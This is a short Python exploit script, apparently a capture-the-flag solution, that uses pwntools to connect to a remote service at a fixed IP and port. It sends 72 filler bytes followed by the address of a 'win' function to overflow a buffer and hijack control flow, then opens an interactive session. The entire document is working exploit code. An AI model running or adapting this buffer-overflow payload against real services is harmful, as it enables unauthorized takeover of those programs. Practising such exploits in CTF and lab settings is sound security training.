from pwn import *

p = remote('165.99.163.122', 7014)
win_addr = 0x4011b6

offset = 72

payload = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)

p.interactive()
